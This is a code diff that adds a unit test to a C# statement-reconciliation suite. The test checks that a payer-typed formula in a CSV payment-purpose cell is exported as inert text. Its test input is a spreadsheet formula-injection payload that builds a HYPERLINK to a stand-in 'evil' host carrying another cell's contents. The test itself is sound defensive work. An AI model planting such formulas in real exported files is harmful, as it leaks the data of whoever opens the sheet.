@@ -91,6 +91,19 @@ public class StatementReconciliationDocumentTests
     }
 
     [Fact]
+    public void The_Csv_MarksAFormulaTypedInThePaymentPurpose()
+    {
+        // `Destination` is the one cell on this file that a payer types. Written as a formula it is
+        // executed by the accountant's spreadsheet the moment the act is opened, so the cell has to
+        // arrive as text - which is what the shared guard in CsvCell does for every file we emit.
+        var act = Act();
+        var typed = act.Rows[0] with { Destination = "=HYPERLINK(\"http://evil/?d=\"&A1)" };
+        var csv = StatementReconciliationCsv.Render(act with { Rows = [typed] });
+
+        csv.Should().Contain("\"'=HYPERLINK");
+    }
+
+    [Fact]
     public void The_Csv_Carries_When_We_Saw_The_Row_And_How_Late_It_Was()
     {
         // The acquirer's timestamp says when the money moved; ours says when the import learned
